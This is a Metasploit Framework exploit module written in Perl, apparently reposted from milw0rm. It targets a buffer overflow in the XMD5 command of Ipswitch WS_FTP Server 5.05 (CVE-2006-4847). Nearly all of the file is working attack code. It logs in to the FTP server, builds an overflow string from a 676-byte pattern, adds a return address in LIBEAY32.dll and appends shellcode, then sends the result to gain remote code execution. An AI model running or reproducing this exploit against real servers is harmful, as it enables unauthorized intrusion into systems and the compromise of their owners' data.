##	
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wsftp_server_505_xmd5;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };
my $info =
  {
	'Name'    => 'WS-FTP Server 5.05 XMD5 Overflow',
	'Version' => '$Revision: 1.0 $',
	'Authors' =>
	  [ 'Jacopo Cervini <acaro [at] jervus.it>',
		
	  ],

	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'  => 0,

	'AutoOpts'  => { 'EXITFUNC' => 'thread' },
	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 21],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
		'USER'  => [1, 'DATA', 'Username', 'ftp'],
		'PASS'  => [1, 'DATA', 'Password', 'ftp'],
	  },

	'Payload' =>
	  {
		'Space'  => 329,
		'BadChars'  => "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e",

		
		'Keys' 		=> ['+ws2ord'],
	  },

	'Description'  =>  Pex::Text::Freeform(qq{
        This module exploits the buffer overflow found in the XMD command
        in IPSWITCH WS_FTP Server 5.05.    
}),

	'Refs'  =>
	  [
		['BID', '20076'],
		[ 'CVE', '2006-4847' ],
	  ],

	'DefaultTarget' => 0,
	'Targets' =>
	  [
		['WS-FTP Server 5.05 Universal', 0x1002e636 ],	# push esp, ret in LIBEAY32.dll
	  ],

	'Keys' => ['wsftp'],

	'DisclosureDate' => 'Sep 14 2006',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}


sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the NOP module.");
		return;
	}

	my $request = Pex::Text::PatternCreate(676);
    $request .= pack("V", $target->[1]);
    $request .= $shellcode;
    
    
    

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $r = $s->RecvLineMulti(20);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("USER ".$self->GetVar('USER')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$s->Send("PASS ".$self->GetVar('PASS')."\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	$self->PrintLine("[*] Attemping to exploit target '".$target->[0]."'...");

	$s->Send("XMD5 $request\n");
	$r = $s->RecvLineMulti(10);
	if (! $r) { $self->PrintLine("[*] No response from FTP server"); return; }
	$self->Print($r);

	sleep(2);
	return;
}

# milw0rm.com [2007-02-19]
